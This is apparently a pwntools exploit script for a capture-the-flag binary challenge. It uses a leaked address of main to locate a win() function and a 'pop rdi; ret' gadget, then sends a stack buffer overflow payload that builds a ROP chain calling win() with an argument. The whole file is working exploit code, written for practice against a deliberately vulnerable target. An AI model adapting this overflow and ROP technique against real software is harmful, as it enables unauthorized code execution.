#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
  # c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #


p.recvuntil(b'you: ')
main_leak = int(p.recvline()[:-1], 16)
win = main_leak  - 0xa5
pop_rdi = main_leak - 0xaa
print(f"win(): {hex(win)}")
print(f"pop rdi; ret: {hex(win)}")

#         vuln_buf              RBP               RIP
payload = p64(0xdeadbeef) * 4 + p64(0xcafebabe) + p64(pop_rdi) + p64(0x1a1a1a1a10101010) + p64(win + 1)
p.sendlineafter(b'pwnme> ', payload)

p.interactive()

# NOTE:
# Ret2win w param
